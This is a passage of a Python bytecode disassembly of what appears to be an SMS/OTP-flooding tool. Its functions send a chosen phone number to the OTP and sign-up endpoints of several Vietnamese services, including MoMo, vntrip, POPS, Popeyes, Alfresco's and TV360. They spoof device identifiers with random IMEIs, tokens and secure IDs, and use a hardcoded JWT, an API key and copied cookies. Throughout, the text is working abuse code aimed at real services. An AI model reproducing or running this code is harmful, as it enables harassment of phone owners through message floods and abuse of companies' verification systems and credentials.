109         126 LOAD_GLOBAL              9 (NULL + get_SECUREID)
            138 PRECALL                  0
            142 CALL                     0
            152 STORE_FAST               3 (secureid)

110         154 LOAD_GLOBAL             11 (NULL + get_TOKEN)
            166 PRECALL                  0
            170 CALL                     0
            180 STORE_FAST               4 (token)

111         182 LOAD_GLOBAL             13 (NULL + generateRandomString)
            194 LOAD_CONST               2 (22)
            196 LOAD_CONST               3 ('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')
            198 PRECALL                  2
            202 CALL                     2
            212 STORE_FAST               5 (rkey)

112         214 LOAD_GLOBAL              7 (NULL + getimei)
            226 PRECALL                  0
            230 CALL                     0
            240 STORE_FAST               6 (aaid)

113         242 BUILD_MAP                0

114         244 LOAD_CONST               4 ('user')
            246 LOAD_CONST               5 ('0')
            248 LOAD_FAST                0 (phone)
            250 LOAD_CONST               6 (1)
            252 LOAD_CONST               7 (11)
            254 BUILD_SLICE              2
            256 BINARY_SUBSCR
            266 BINARY_OP                0 (+)

113         270 MAP_ADD                  1

115         272 LOAD_CONST               8 ('msgType')
            274 LOAD_CONST               9 ('SEND_OTP_MSG')

113         276 MAP_ADD                  1

116         278 LOAD_CONST              10 ('cmdId')
            280 LOAD_FAST                1 (microtime)
            282 FORMAT_VALUE             0
            284 LOAD_CONST              11 ('000000')
            286 BUILD_STRING             2

113         288 MAP_ADD                  1

117         290 LOAD_CONST              12 ('lang')
            292 LOAD_CONST              13 ('vi')

113         294 MAP_ADD                  1

118         296 LOAD_CONST              14 ('time')
            298 LOAD_FAST                1 (microtime)

113         300 MAP_ADD                  1

119         302 LOAD_CONST              15 ('channel')
            304 LOAD_CONST              16 ('APP')

113         306 MAP_ADD                  1

120         308 LOAD_CONST              17 ('appVer')
            310 LOAD_CONST              18 (31062)

113         312 MAP_ADD                  1

121         314 LOAD_CONST              19 ('appCode')
            316 LOAD_CONST              20 ('3.1.6')

113         318 MAP_ADD                  1

122         320 LOAD_CONST              21 ('deviceOS')
            322 LOAD_CONST              22 ('ANDROID')

113         324 MAP_ADD                  1

123         326 LOAD_CONST              23 ('buildNumber')
            328 LOAD_CONST              24 (0)

113         330 MAP_ADD                  1

124         332 LOAD_CONST              25 ('appId')
            334 LOAD_CONST              26 ('vn.momo.platform')

113         336 MAP_ADD                  1

125         338 LOAD_CONST              27 ('result')
            340 LOAD_CONST              28 (True)

113         342 MAP_ADD                  1

126         344 LOAD_CONST              29 ('errorCode')
            346 LOAD_CONST              24 (0)

113         348 MAP_ADD                  1

127         350 LOAD_CONST              30 ('errorDesc')
            352 LOAD_CONST              31 ('')

113         354 MAP_ADD                  1

128         356 LOAD_CONST              32 ('momoMsg')

129         358 LOAD_CONST              33 ('mservice.backend.entity.msg.RegDeviceMsg')

130         360 LOAD_CONST               5 ('0')
            362 LOAD_FAST                0 (phone)
            364 LOAD_CONST               6 (1)
            366 LOAD_CONST               7 (11)
            368 BUILD_SLICE              2
            370 BINARY_SUBSCR
            380 BINARY_OP                0 (+)

131         384 LOAD_FAST                2 (imei)

132         386 LOAD_CONST              34 ('Vietnam')

133         388 LOAD_CONST              35 ('084')

134         390 LOAD_CONST              36 ('CPH1605')

135         392 LOAD_CONST              37 ('23')

136         394 LOAD_CONST              38 ('mt6755')

137         396 LOAD_CONST              39 ('OPPO')

138         398 LOAD_CONST              31 ('')

139         400 LOAD_CONST              31 ('')

140         402 LOAD_CONST              40 ('452')

141         404 LOAD_CONST              41 ('Android')

142         406 LOAD_FAST                3 (secureid)

128         408 LOAD_CONST              42 (('_class', 'number', 'imei', 'cname', 'ccode', 'device', 'firmware', 'hardware', 'manufacture', 'csp', 'icc', 'mcc', 'device_os', 'secure_id'))
            410 BUILD_CONST_KEY_MAP     14

113         412 MAP_ADD                  1

144         414 LOAD_CONST              43 ('extra')

145         416 LOAD_CONST              44 ('SEND')

146         418 LOAD_FAST                5 (rkey)

147         420 LOAD_FAST                6 (aaid)

148         422 LOAD_CONST              31 ('')

149         424 LOAD_FAST                4 (token)

150         426 LOAD_CONST              31 ('')

151         428 LOAD_FAST                3 (secureid)

152         430 LOAD_CONST              45 ('oppo cph1605mt6755b6z9qwrwhuy9yhrk')

153         432 LOAD_CONST              28 (True)

154         434 LOAD_CONST              28 (True)

155         436 LOAD_CONST              31 ('')

144         438 LOAD_CONST              46 (('action', 'rkey', 'AAID', 'IDFA', 'TOKEN', 'SIMULATOR', 'SECUREID', 'MODELID', 'isVoice', 'REQUIRE_HASH_STRING_OTP', 'checkSum'))
            440 BUILD_CONST_KEY_MAP     11

113         442 MAP_ADD                  1
            444 STORE_FAST               7 (data)

158         446 BUILD_MAP                0

159         448 LOAD_CONST               4 ('user')
            450 LOAD_CONST               5 ('0')
            452 LOAD_FAST                0 (phone)
            454 LOAD_CONST               6 (1)
            456 LOAD_CONST               7 (11)
            458 BUILD_SLICE              2
            460 BINARY_SUBSCR
            470 BINARY_OP                0 (+)

158         474 MAP_ADD                  1

160         476 LOAD_CONST               8 ('msgType')
            478 LOAD_CONST              47 ('CHECK_USER_BE_MSG')

158         480 MAP_ADD                  1

161         482 LOAD_CONST              10 ('cmdId')
            484 LOAD_FAST                1 (microtime)
            486 FORMAT_VALUE             0
            488 LOAD_CONST              11 ('000000')
            490 BUILD_STRING             2

158         492 MAP_ADD                  1

162         494 LOAD_CONST              12 ('lang')
            496 LOAD_CONST              13 ('vi')

158         498 MAP_ADD                  1

163         500 LOAD_CONST              14 ('time')
            502 LOAD_FAST                1 (microtime)

158         504 MAP_ADD                  1

164         506 LOAD_CONST              15 ('channel')
            508 LOAD_CONST              16 ('APP')

158         510 MAP_ADD                  1

165         512 LOAD_CONST              17 ('appVer')
            514 LOAD_CONST              18 (31062)

158         516 MAP_ADD                  1

166         518 LOAD_CONST              19 ('appCode')
            520 LOAD_CONST              20 ('3.1.6')

158         522 MAP_ADD                  1

167         524 LOAD_CONST              21 ('deviceOS')
            526 LOAD_CONST              22 ('ANDROID')

158         528 MAP_ADD                  1

168         530 LOAD_CONST              23 ('buildNumber')
            532 LOAD_CONST              24 (0)

158         534 MAP_ADD                  1

169         536 LOAD_CONST              25 ('appId')
            538 LOAD_CONST              26 ('vn.momo.platform')

158         540 MAP_ADD                  1

170         542 LOAD_CONST              27 ('result')
            544 LOAD_CONST              28 (True)

158         546 MAP_ADD                  1

171         548 LOAD_CONST              29 ('errorCode')
            550 LOAD_CONST              24 (0)

158         552 MAP_ADD                  1

172         554 LOAD_CONST              30 ('errorDesc')
            556 LOAD_CONST              31 ('')

158         558 MAP_ADD                  1

173         560 LOAD_CONST              32 ('momoMsg')

174         562 LOAD_CONST              33 ('mservice.backend.entity.msg.RegDeviceMsg')

175         564 LOAD_CONST               5 ('0')
            566 LOAD_FAST                0 (phone)
            568 LOAD_CONST               6 (1)
            570 LOAD_CONST               7 (11)
            572 BUILD_SLICE              2
            574 BINARY_SUBSCR
            584 BINARY_OP                0 (+)

176         588 LOAD_FAST                2 (imei)

177         590 LOAD_CONST              34 ('Vietnam')

178         592 LOAD_CONST              35 ('084')

179         594 LOAD_CONST              36 ('CPH1605')

180         596 LOAD_CONST              37 ('23')

181         598 LOAD_CONST              38 ('mt6755')

182         600 LOAD_CONST              39 ('OPPO')

183         602 LOAD_CONST              31 ('')

184         604 LOAD_CONST              31 ('')

185         606 LOAD_CONST              40 ('452')

186         608 LOAD_CONST              41 ('Android')

187         610 LOAD_FAST                3 (secureid)

173         612 LOAD_CONST              42 (('_class', 'number', 'imei', 'cname', 'ccode', 'device', 'firmware', 'hardware', 'manufacture', 'csp', 'icc', 'mcc', 'device_os', 'secure_id'))
            614 BUILD_CONST_KEY_MAP     14

158         616 MAP_ADD                  1

189         618 LOAD_CONST              43 ('extra')

190         620 LOAD_CONST              48 ('checkSum')
            622 LOAD_CONST              31 ('')

189         624 BUILD_MAP                1

158         626 MAP_ADD                  1
            628 STORE_FAST               8 (data1)

194         630 LOAD_CONST              49 ('undefined')

195         632 LOAD_CONST              31 ('')

196         634 LOAD_CONST              49 ('undefined')

197         636 LOAD_CONST              50 ('Bearer undefined')

198         638 LOAD_CONST               9 ('SEND_OTP_MSG')

199         640 LOAD_CONST              51 ('api.momo.vn')

200         642 LOAD_CONST              52 ('okhttp/3.14.17')

201         644 LOAD_CONST              53 ('31062')

202         646 LOAD_CONST              20 ('3.1.6')

203         648 LOAD_CONST              22 ('ANDROID')

204         650 LOAD_CONST              54 ('application/json')

193         652 LOAD_CONST              55 (('agent_id', 'sessionkey', 'user_phone', 'authorization', 'msgtype', 'Host', 'User-Agent', 'app_version', 'app_code', 'device_os', 'Content-Type'))
            654 BUILD_CONST_KEY_MAP     11
            656 STORE_FAST               9 (h)

206         658 LOAD_GLOBAL             15 (NULL + json)
            670 LOAD_ATTR                8 (dumps)
            680 LOAD_FAST                7 (data)
            682 PRECALL                  1
            686 CALL                     1
            696 STORE_FAST               7 (data)

207         698 LOAD_GLOBAL             15 (NULL + json)
            710 LOAD_ATTR                8 (dumps)
            720 LOAD_FAST                8 (data1)
            722 PRECALL                  1
            726 CALL                     1
            736 STORE_FAST               8 (data1)

208         738 LOAD_GLOBAL             19 (NULL + requests)
            750 LOAD_ATTR               10 (post)
            760 LOAD_CONST              56 ('https://api.momo.vn/backend/auth-app/public/CHECK_USER_BE_MSG')
            762 LOAD_FAST                9 (h)
            764 LOAD_FAST                8 (data1)
            766 KW_NAMES                57
            768 PRECALL                  3
            772 CALL                     3
            782 LOAD_ATTR               11 (text)
            792 POP_TOP

209         794 LOAD_GLOBAL             19 (NULL + requests)
            806 LOAD_ATTR               10 (post)
            816 LOAD_CONST              58 ('https://api.momo.vn/backend/otp-app/public/SEND_OTP_MSG')
            818 LOAD_FAST                9 (h)
            820 LOAD_FAST                7 (data)
            822 KW_NAMES                57
            824 PRECALL                  3
            828 CALL                     3
            838 STORE_FAST              10 (t)

210         840 NOP

211         842 LOAD_FAST               10 (t)
            844 LOAD_METHOD              7 (json)
            866 PRECALL                  0
            870 CALL                     0
            880 STORE_FAST              10 (t)
            882 LOAD_CONST               0 (None)
            884 RETURN_VALUE
        >>  886 PUSH_EXC_INFO

212         888 POP_TOP

213         890 LOAD_FAST               10 (t)
            892 LOAD_ATTR               11 (text)
            902 STORE_FAST              10 (t)
            904 POP_EXCEPT
            906 LOAD_CONST               0 (None)
            908 RETURN_VALUE
        >>  910 COPY                     3
            912 POP_EXCEPT
            914 RERAISE                  1
ExceptionTable:
  842 to 880 -> 886 [0]
  886 to 902 -> 910 [1] lasti

Disassembly of <code object generateRandomString at 0x7f48c6da29a0, file "<x>", line 214>:
214           0 RESUME                   0

215           2 LOAD_CONST               1 ('')
              4 LOAD_METHOD              0 (join)
             26 LOAD_GLOBAL              3 (NULL + random)
             38 LOAD_ATTR                2 (choices)
             48 LOAD_FAST                1 (minh)
             50 LOAD_FAST                0 (length)
             52 KW_NAMES                 2
             54 PRECALL                  2
             58 CALL                     2
             68 PRECALL                  1
             72 CALL                     1
             82 RETURN_VALUE

Disassembly of <code object get_SECUREID at 0x7f48c6da2ab0, file "<x>", line 216>:
216           0 RESUME                   0

217           2 LOAD_CONST               1 ('')
              4 LOAD_METHOD              0 (join)
             26 LOAD_GLOBAL              3 (NULL + random)
             38 LOAD_ATTR                2 (choices)
             48 LOAD_CONST               2 ('0123456789abcdef')
             50 LOAD_CONST               3 (17)
             52 KW_NAMES                 4
             54 PRECALL                  2
             58 CALL                     2
             68 PRECALL                  1
             72 CALL                     1
             82 RETURN_VALUE

Disassembly of <code object getimei at 0x7f48c6bd8030, file "<x>", line 218>:
218           0 RESUME                   0

219           2 LOAD_GLOBAL              1 (NULL + generateRandomString)
             14 LOAD_CONST               1 (8)
             16 LOAD_CONST               2 ('0123456789abcdef')
             18 PRECALL                  2
             22 CALL                     2
             32 LOAD_CONST               3 ('-')
             34 BINARY_OP                0 (+)
             38 LOAD_GLOBAL              1 (NULL + generateRandomString)
             50 LOAD_CONST               4 (4)
             52 LOAD_CONST               2 ('0123456789abcdef')
             54 PRECALL                  2
             58 CALL                     2
             68 BINARY_OP                0 (+)
             72 LOAD_CONST               3 ('-')
             74 BINARY_OP                0 (+)
             78 LOAD_GLOBAL              1 (NULL + generateRandomString)
             90 LOAD_CONST               4 (4)
             92 LOAD_CONST               2 ('0123456789abcdef')
             94 PRECALL                  2
             98 CALL                     2
            108 BINARY_OP                0 (+)
            112 LOAD_CONST               3 ('-')
            114 BINARY_OP                0 (+)
            118 LOAD_GLOBAL              1 (NULL + generateRandomString)
            130 LOAD_CONST               4 (4)
            132 LOAD_CONST               2 ('0123456789abcdef')
            134 PRECALL                  2
            138 CALL                     2
            148 BINARY_OP                0 (+)
            152 LOAD_CONST               3 ('-')
            154 BINARY_OP                0 (+)
            158 LOAD_GLOBAL              1 (NULL + generateRandomString)
            170 LOAD_CONST               5 (12)
            172 LOAD_CONST               2 ('0123456789abcdef')
            174 PRECALL                  2
            178 CALL                     2
            188 BINARY_OP                0 (+)
            192 RETURN_VALUE

Disassembly of <code object get_TOKEN at 0x127d890, file "<x>", line 220>:
220           0 RESUME                   0

221           2 LOAD_GLOBAL              1 (NULL + generateRandomString)
             14 LOAD_CONST               1 (22)
             16 LOAD_CONST               2 ('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')
             18 PRECALL                  2
             22 CALL                     2
             32 LOAD_CONST               3 (':')
             34 BINARY_OP                0 (+)
             38 LOAD_GLOBAL              1 (NULL + generateRandomString)
             50 LOAD_CONST               4 (9)
             52 LOAD_CONST               2 ('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')
             54 PRECALL                  2
             58 CALL                     2
             68 BINARY_OP                0 (+)
             72 LOAD_CONST               5 ('-')
             74 BINARY_OP                0 (+)
             78 LOAD_GLOBAL              1 (NULL + generateRandomString)
             90 LOAD_CONST               6 (20)
             92 LOAD_CONST               2 ('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')
             94 PRECALL                  2
             98 CALL                     2
            108 BINARY_OP                0 (+)
            112 LOAD_CONST               5 ('-')
            114 BINARY_OP                0 (+)
            118 LOAD_GLOBAL              1 (NULL + generateRandomString)
            130 LOAD_CONST               7 (12)
            132 LOAD_CONST               2 ('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')
            134 PRECALL                  2
            138 CALL                     2
            148 BINARY_OP                0 (+)
            152 LOAD_CONST               5 ('-')
            154 BINARY_OP                0 (+)
            158 LOAD_GLOBAL              1 (NULL + generateRandomString)
            170 LOAD_CONST               8 (7)
            172 LOAD_CONST               2 ('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')
            174 PRECALL                  2
            178 CALL                     2
            188 BINARY_OP                0 (+)
            192 LOAD_CONST               5 ('-')
            194 BINARY_OP                0 (+)
            198 LOAD_GLOBAL              1 (NULL + generateRandomString)
            210 LOAD_CONST               8 (7)
            212 LOAD_CONST               2 ('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')
            214 PRECALL                  2
            218 CALL                     2
            228 BINARY_OP                0 (+)
            232 LOAD_CONST               5 ('-')
            234 BINARY_OP                0 (+)
            238 LOAD_GLOBAL              1 (NULL + generateRandomString)
            250 LOAD_CONST               9 (53)
            252 LOAD_CONST               2 ('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')
            254 PRECALL                  2
            258 CALL                     2
            268 BINARY_OP                0 (+)
            272 LOAD_CONST               5 ('-')
            274 BINARY_OP                0 (+)
            278 LOAD_GLOBAL              1 (NULL + generateRandomString)
            290 LOAD_CONST               4 (9)
            292 LOAD_CONST               2 ('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')
            294 PRECALL                  2
            298 CALL                     2
            308 BINARY_OP                0 (+)
            312 LOAD_CONST              10 ('_')
            314 BINARY_OP                0 (+)
            318 LOAD_GLOBAL              1 (NULL + generateRandomString)
            330 LOAD_CONST              11 (11)
            332 LOAD_CONST               2 ('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')
            334 PRECALL                  2
            338 CALL                     2
            348 BINARY_OP                0 (+)
            352 LOAD_CONST               5 ('-')
            354 BINARY_OP                0 (+)
            358 LOAD_GLOBAL              1 (NULL + generateRandomString)
            370 LOAD_CONST              12 (4)
            372 LOAD_CONST               2 ('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')
            374 PRECALL                  2
            378 CALL                     2
            388 BINARY_OP                0 (+)
            392 RETURN_VALUE

Disassembly of <code object vntrip at 0x7f48c6da3220, file "<x>", line 223>:
223           0 RESUME                   0

224           2 LOAD_GLOBAL              1 (NULL + requests)
             14 LOAD_ATTR                1 (post)
             24 LOAD_CONST               1 ('https://micro-services.vntrip.vn/core-user-service/verification/request/phone')
             26 LOAD_GLOBAL              4 (ua)
             38 LOAD_GLOBAL              6 (json_data)
             50 KW_NAMES                 2
             52 PRECALL                  3
             56 CALL                     3
             66 LOAD_ATTR                4 (text)
             76 STORE_FAST               1 (response_vntrip)
             78 LOAD_CONST               0 (None)
             80 RETURN_VALUE

Disassembly of <code object pop at 0x7f48c6bd81b0, file "<x>", line 226>:
226           0 RESUME                   0

227           2 LOAD_GLOBAL              1 (NULL + requests)
             14 LOAD_ATTR                1 (post)
             24 LOAD_CONST               1 ('https://products.popsww.com/api/v5/auths/register')
             26 BUILD_MAP                0
             28 LOAD_CONST               2 ('Host')
             30 LOAD_CONST               3 ('products.popsww.com')
             32 MAP_ADD                  1
             34 LOAD_CONST               4 ('content-length')
             36 LOAD_CONST               5 ('89')
             38 MAP_ADD                  1
             40 LOAD_CONST               6 ('profileid')
             42 LOAD_CONST               7 ('62e58a27c6f857005396318f')
             44 MAP_ADD                  1
             46 LOAD_CONST               8 ('sec-ch-ua-mobile')
             48 LOAD_CONST               9 ('?1')
             50 MAP_ADD                  1
             52 LOAD_CONST              10 ('authorization')
             54 LOAD_CONST              11 ('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6InI1aTZqN3dUTERBS3hMV3lZcDdaM2ZnUUJKNWk3U2tmRkJHR2tNNUlCSlYycFdiRDNwbVd1MUM2eTQyVHJRaUIiLCJ1c2VySWQiOiI2MmU1OGEyN2M2Zjg1NzAwNTM5NjMxOGUiLCJyb2xlcyI6WyJHVUVTVCJdLCJwcm9maWxlcyI6W3siaWQiOiI2MmU1OGEyN2M2Zjg1NzAwNTM5NjMxOGYiLCJhZ2UiOjEzLCJtcGFhIjp7ImlkIjoiNWQyM2UxMjU5NTI1MWI5OGJkMDQzMzc2IiwiYWdlIjoxM319LHsiaWQiOiI2MmU1OGEyN2M2Zjg1NzAwNTM5NjMxOTAiLCJhZ2UiOjcsIm1wYWEiOnsiaWQiOiI1ZDIzZTFlMjk1MjUxYjk4YmQwNDM0MWQiLCJhZ2UiOjd9fV0sImlhdCI6MTY1OTIxMDI3OSwiZXhwIjoxOTc0NTcwMjc5fQ.3exZEvv0YG1Uw0UYx2Mt9Oj3NhRb8BX-l4tIAcVv9gw')
             56 MAP_ADD                  1
             58 LOAD_CONST              12 ('x-env')
             60 LOAD_CONST              13 ('production')
             62 MAP_ADD                  1
             64 LOAD_CONST              14 ('content-type')
             66 LOAD_CONST              15 ('application/json')
             68 MAP_ADD                  1
             70 LOAD_CONST              16 ('lang')
             72 LOAD_CONST              17 ('vi')
             74 MAP_ADD                  1
             76 LOAD_CONST              18 ('sub-api-version')
             78 LOAD_CONST              19 ('1.1')
             80 MAP_ADD                  1
             82 LOAD_CONST              20 ('user-agent')
             84 LOAD_CONST              21 ('Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36')
             86 MAP_ADD                  1
             88 LOAD_CONST              22 ('api-key')
             90 LOAD_CONST              23 ('5d2300c2c69d24a09cf5b09b')
             92 MAP_ADD                  1
             94 LOAD_CONST              24 ('platform')
             96 LOAD_CONST              25 ('wap')
             98 MAP_ADD                  1
            100 LOAD_CONST              26 ('sec-ch-ua-platform')
            102 LOAD_CONST              27 ('"Linux"')
            104 MAP_ADD                  1
            106 LOAD_CONST              28 ('accept')
            108 LOAD_CONST              29 ('*/*')
            110 MAP_ADD                  1
            112 LOAD_CONST              30 ('origin')
            114 LOAD_CONST              31 ('https://pops.vn')
            116 MAP_ADD                  1
            118 LOAD_CONST              32 ('sec-fetch-site')
            120 LOAD_CONST              33 ('cross-site')
            122 MAP_ADD                  1
            124 LOAD_CONST              34 ('sec-fetch-mode')
            126 LOAD_CONST              35 ('cors')
            128 MAP_ADD                  1
            130 LOAD_CONST              36 ('empty')
            132 LOAD_CONST              37 ('https://pops.vn/auth/signin-signup/signup?isOffSelectProfile=true')
            134 LOAD_CONST              38 ('gzip, deflate, br')
            136 LOAD_CONST              39 (('sec-fetch-dest', 'referer', 'accept-encoding'))
            138 BUILD_CONST_KEY_MAP      3
            140 DICT_UPDATE              1
            142 LOAD_CONST              40 ('')
            144 LOAD_FAST                0 (phone)
            146 LOAD_CONST              41 ('Abcxaxgh')
            148 LOAD_CONST              41 ('Abcxaxgh')
            150 LOAD_CONST              42 (('fullName', 'account', 'password', 'confirmPassword'))
            152 BUILD_CONST_KEY_MAP      4
            154 KW_NAMES                43
            156 PRECALL                  3
            160 CALL                     3
            170 LOAD_ATTR                2 (text)
            180 POP_TOP
            182 LOAD_CONST               0 (None)
            184 RETURN_VALUE

Disassembly of <code object poy at 0x7f48c6de56b0, file "<x>", line 229>:
229           0 RESUME                   0

231           2 LOAD_CONST               1 ('1.1.1399171366.1685593865')

232           4 LOAD_CONST               2 ('GA1.2.601043050.1685593865')

233           6 LOAD_CONST               3 ('1')

234           8 LOAD_CONST               3 ('1')

235          10 LOAD_CONST               4 ('GA1.1.1352914107.1685593865')

236          12 LOAD_CONST               5 ('GS1.1.1685593865.1.0.1685593865.0.0.0')

237          14 LOAD_CONST               6 ('1685593865')

238          16 LOAD_CONST               7 ('3060068c024c57cf5bccf43037278ef8')

239          18 LOAD_CONST               8 ('')

240          20 LOAD_CONST               9 ('0')

241          22 LOAD_CONST              10 ('fb.1.1685593872828.2142938916')

242          24 LOAD_CONST              11 ('GS1.1.1685593865.1.1.1685593885.0.0.0')

243          26 LOAD_CONST              12 ('GS1.1.1685593865.1.1.1685593885.40.0.0')

230          28 LOAD_CONST              13 (('_gcl_au', '_gid', '_gat_UA-106834068-1', '_gat_UA-149855316-1', '_ga', '_ga_Y4V7XHSR6R', '__admUTMtime', '__uidac', '__iid', '__su', '_fbp', '_ga_4YCG78W1LS', '_ga_X3WSB3MZGL'))
             30 BUILD_CONST_KEY_MAP     13
             32 STORE_FAST               1 (cookies)

247          34 LOAD_CONST              14 ('api.popeyes.vn')

248          36 LOAD_CONST              15 ('application/json')

249          38 LOAD_CONST              16 ('vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5')

250          40 LOAD_CONST              15 ('application/json')

252          42 LOAD_CONST              17 ('https://popeyes.vn')

253          44 LOAD_CONST              18 ('https://popeyes.vn/')

254          46 LOAD_CONST              19 ('"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"')

255          48 LOAD_CONST              20 ('?0')

256          50 LOAD_CONST              21 ('"Windows"')

257          52 LOAD_CONST              22 ('empty')

258          54 LOAD_CONST              23 ('cors')

259          56 LOAD_CONST              24 ('same-site')

260          58 LOAD_CONST              25 ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36')

261          60 LOAD_CONST              26 ('WebApp')

246          62 LOAD_CONST              27 (('authority', 'accept', 'accept-language', 'content-type', 'origin', 'referer', 'sec-ch-ua', 'sec-ch-ua-mobile', 'sec-ch-ua-platform', 'sec-fetch-dest', 'sec-fetch-mode', 'sec-fetch-site', 'user-agent', 'x-client'))
             64 BUILD_CONST_KEY_MAP     14
             66 STORE_FAST               2 (headers)

265          68 LOAD_FAST                0 (phone)

266          70 LOAD_CONST              28 ('to')

267          72 LOAD_CONST              29 ('lon xinh')

268          74 LOAD_CONST              30 ('hihi@gmail.com')

264          76 LOAD_CONST              31 (('phone', 'firstName', 'lastName', 'email'))
             78 BUILD_CONST_KEY_MAP      4
             80 STORE_FAST               3 (json_data)

271          82 LOAD_GLOBAL              1 (NULL + requests)
             94 LOAD_ATTR                1 (post)
            104 LOAD_CONST              32 ('https://api.popeyes.vn/api/v1/register')
            106 LOAD_FAST                1 (cookies)
            108 LOAD_FAST                2 (headers)
            110 LOAD_FAST                3 (json_data)
            112 KW_NAMES                33
            114 PRECALL                  4
            118 CALL                     4
            128 STORE_FAST               4 (response)
            130 LOAD_CONST               0 (None)
            132 RETURN_VALUE

Disassembly of <code object alfres at 0x7f48c6d74d20, file "<x>", line 272>:
272           0 RESUME                   0

273           2 LOAD_GLOBAL              1 (NULL + requests)
             14 LOAD_ATTR                1 (post)
             24 LOAD_CONST               1 ('https://api.alfrescos.com.vn/api/v1/User/SendSms?culture=vi-VN')
             26 BUILD_MAP                0
             28 LOAD_CONST               2 ('Host')
             30 LOAD_CONST               3 ('api.alfrescos.com.vn')
             32 MAP_ADD                  1
             34 LOAD_CONST               4 ('content-length')
             36 LOAD_CONST               5 ('124')
             38 MAP_ADD                  1
             40 LOAD_CONST               6 ('accept-language')
             42 LOAD_CONST               7 ('vi-VN')
             44 MAP_ADD                  1
             46 LOAD_CONST               8 ('sec-ch-ua-mobile')
             48 LOAD_CONST               9 ('?1')
             50 MAP_ADD                  1
             52 LOAD_CONST              10 ('user-agent')
             54 LOAD_CONST              11 ('Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36')
             56 MAP_ADD                  1
             58 LOAD_CONST              12 ('content-type')
             60 LOAD_CONST              13 ('application/json')
             62 MAP_ADD                  1
             64 LOAD_CONST              14 ('accept')
             66 LOAD_CONST              15 ('application/json, text/plain, */*')
             68 MAP_ADD                  1
             70 LOAD_CONST              16 ('brandcode')
             72 LOAD_CONST              17 ('ALFRESCOS')
             74 MAP_ADD                  1
             76 LOAD_CONST              18 ('devicecode')
             78 LOAD_CONST              19 ('web')
             80 MAP_ADD                  1
             82 LOAD_CONST              20 ('sec-ch-ua-platform')
             84 LOAD_CONST              21 ('"Android"')
             86 MAP_ADD                  1
             88 LOAD_CONST              22 ('origin')
             90 LOAD_CONST              23 ('https://alfrescos.com.vn')
             92 MAP_ADD                  1
             94 LOAD_CONST              24 ('sec-fetch-site')
             96 LOAD_CONST              25 ('same-site')
             98 MAP_ADD                  1
            100 LOAD_CONST              26 ('sec-fetch-mode')
            102 LOAD_CONST              27 ('cors')
            104 MAP_ADD                  1
            106 LOAD_CONST              28 ('sec-fetch-dest')
            108 LOAD_CONST              29 ('empty')
            110 MAP_ADD                  1
            112 LOAD_CONST              30 ('referer')
            114 LOAD_CONST              31 ('https://alfrescos.com.vn/')
            116 MAP_ADD                  1
            118 LOAD_CONST              32 ('accept-encoding')
            120 LOAD_CONST              33 ('gzip, deflate, br')
            122 MAP_ADD                  1
            124 LOAD_FAST                0 (phone)
            126 LOAD_CONST              34 ('add789229e0794d8508f948dacd710ae')
            128 LOAD_CONST              35 ('')
            130 LOAD_CONST              36 (1660806807513)
            132 LOAD_CONST              37 (2)
            134 LOAD_CONST              38 (('phoneNumber', 'secureHash', 'deviceId', 'sendTime', 'type'))
            136 BUILD_CONST_KEY_MAP      5
            138 KW_NAMES                39
            140 PRECALL                  3
            144 CALL                     3
            154 LOAD_ATTR                2 (text)
            164 POP_TOP
            166 LOAD_CONST               0 (None)
            168 RETURN_VALUE

Disassembly of <code object tv360 at 0x7f48c6df4e70, file "<x>", line 275>:
275           0 RESUME                   0

276           2 LOAD_GLOBAL              1 (NULL + requests)
             14 LOAD_ATTR                1 (post)
             24 LOAD_CONST               1 ('http://m.tv360.vn/public/v1/auth/get-otp-login')
             26 LOAD_CONST               2 ('m.tv360.vn')
             28 LOAD_CONST               3 ('keep-alive')
             30 LOAD_CONST               4 ('23')
             32 LOAD_CONST               5 ('application/json, text/plain, */*')
             34 LOAD_CONST               6 ('Mozilla/5.0 (Linux; Android 10; moto e(7i) power Build/QOJ30.500-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36')
             36 LOAD_CONST               7 ('application/json')
             38 LOAD_CONST               8 ('http://m.tv360.vn')
             40 LOAD_CONST               9 ('http://m.tv360.vn/login?r=http%3A%2F%2Fm.tv360.vn%2F')
             42 LOAD_CONST              10 ('gzip, deflate')
             44 LOAD_CONST              11 (('Host', 'Connection', 'Content-Length', 'Accept', 'User-Agent', 'Content-Type', 'Origin', 'Referer', 'Accept-Encoding'))
             46 BUILD_CONST_KEY_MAP      9
             48 LOAD_CONST              12 ('msisdn')
             50 LOAD_CONST              13 ('0')
             52 LOAD_FAST                0 (phone)
             54 LOAD_CONST              14 (1)
             56 LOAD_CONST              15 (11)
             58 BUILD_SLICE              2
             60 BINARY_SUBSCR
             70 BINARY_OP                0 (+)
             74 BUILD_MAP                1
             76 KW_NAMES                16
             78 PRECALL                  3
             82 CALL                     3
             92 LOAD_ATTR                2 (text)
            102 POP_TOP
            104 LOAD_CONST               0 (None)
